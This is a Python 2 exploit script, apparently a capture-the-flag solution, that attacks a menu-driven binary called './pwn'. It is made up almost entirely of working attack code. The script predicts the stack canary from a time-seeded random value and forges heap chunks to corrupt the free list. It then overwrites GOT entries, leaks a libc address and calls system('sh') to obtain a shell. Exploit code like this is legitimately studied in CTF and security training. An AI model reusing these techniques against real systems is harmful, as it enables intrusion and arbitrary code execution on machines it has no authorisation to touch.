from zio import *
import base64, urllib2, os, time

# attack pseudo-random
target = ('172.16.0.104', 2333)
def leak_canary():
    local = True
    while True:
        if local:
            leak        = int(os.popen('./leak ' + str(int(time.time()))).read())
        else:
            date        = urllib2.urlopen('http://172.16.0.104').headers['Date']
            leak_time   = int(time.mktime(time.strptime(date, '%a, %d %b %Y  %H:%M:%S %Z')))
            print 'hello'
            leak_time   += random.randint(0, 3)
            print leak_time
            leak        = int(os.popen('./leak ' + str(int(leak_time))).read())
        if leak ^ 0x40000000 >= 0x40000000:
            break
    print '[+] random leak\t:\t' + hex(leak)
    return leak

def exp():
    io  = zio('./pwn', print_read = COLORED(RAW, 'blue'), print_write = COLORED(RAW, 'red'), timeout = 10000)
    io.hint([0x400fe8, 0x4022ec])
    
    adr_fake = 0x604140
    got = 0x604000
    
    # login
    io.wl(base64.b64encode('AAAAB'))
    io.rtl('id?')
    
    canary = leak_canary()
    
    io.wl('A' * 0x20)
    io.rtl('A' * 0x20)
    heap_base = l64(io.rtl(',')[:-1].ljust(0x8, '\x00')) - 0x10
    print '[+] heap base : 0x%x' % heap_base
    io.rtl("hello?")
    payload  = l64(0x0)
    payload += l64(0xb1)
    payload += l64(heap_base + 0xe0)
    payload += l64(adr_fake + 4*0x8)
    
    payload += l64(0x0)
    payload += l64(0xb1)
    payload += l64(adr_fake)
    
    io.wl(payload)
    
    # malloc [0] [1] [2]
    io.rtl('choice')
    io.wls([1, 1, 'AAAA', 'DDDD'])
    io.rtl('choice')
    io.wls([1, 1, 'AAAA', 'DDDD'])
    io.rtl('choice')
    io.wls([1, 1, 'AAAA', 'DDDD'])
    
    # free [1]
    io.rtl('choice')
    io.wls([2, 1])
    
    # serial malloc a larger chunk
    io.rtl('choice')
    io.wls([5, 1])
    
    payload  = 'A' * 0x8
    payload += l64(heap_base + 0x80)
    payload += l64(0x0)
    payload += 'A' * 0x10
    payload += l64(heap_base + 0xa0)
    payload += l64(heap_base + 0x60)
    payload += 'A' * 0x10
    payload += l64(got - 0x10)
    payload += l64(heap_base + 0x80)
    payload  = payload.ljust(0x60, 'A')
    payload += l64(canary)          # canary
    
    payload  = payload.ljust(0x88, 'A')
    
    payload += l64(0x0)
    payload += l64(0xb1)
    payload += l64(0x0)
    payload += l64(adr_fake)    # fake bk
    
    # edit [0] to overflow to [1]
    io.rtl('choice')
    io.wls([3, 0, 1, 'AAAA', payload])
    
    io.rtl('choice')
    io.wl(1)
    io.wl('AAAA')
    io.wl('BBBB')
    io.wl('CCCC')
    
    # overwrite head 
    io.rtl('choice')
    payload = 'C' * 0x8 + l64(heap_base + 0x60) + l64(canary) + l64(0x0)
    io.wls([1, 1, 'BBBB', payload])
    
    # leak
    io.rtl('choice')
    io.wl(4)
    io.rtl('[3]')
    io.rtl('description:')
    adr_free    = l64(io.rl()[:-1].ljust(0x8, '\x00'))
    
    off_free    = 0x0000000000082df0
    libc_base   =  adr_free - off_free
    off_system  = 0x0000000000046640
    adr_system  = libc_base + off_system
    off_read    = 0x00000000000eb800
    adr_read    = libc_base + off_read
    off_print_c = 0x0000000000109280
    adr_print_c = libc_base + off_print_c
    print '[+] free: 0x%x' % adr_free
    
    io.rtl('choice')
    payload  = 'A' * 0x28
    payload += l64(adr_read)
    payload  = payload.ljust(0x60, 'A')
    payload += l64(canary)          # canary
    payload  = payload.ljust(0x78, 'A')
    payload += l64(adr_print_c)
    payload += 'A' * 0x8
    payload += l64(adr_system)
    
    io.wls([3, 3, 1, 'BBBB', payload])
    io.wl('sh\x00')
    
    io.itr()

try:
    exp()
except:
    print 'wait'
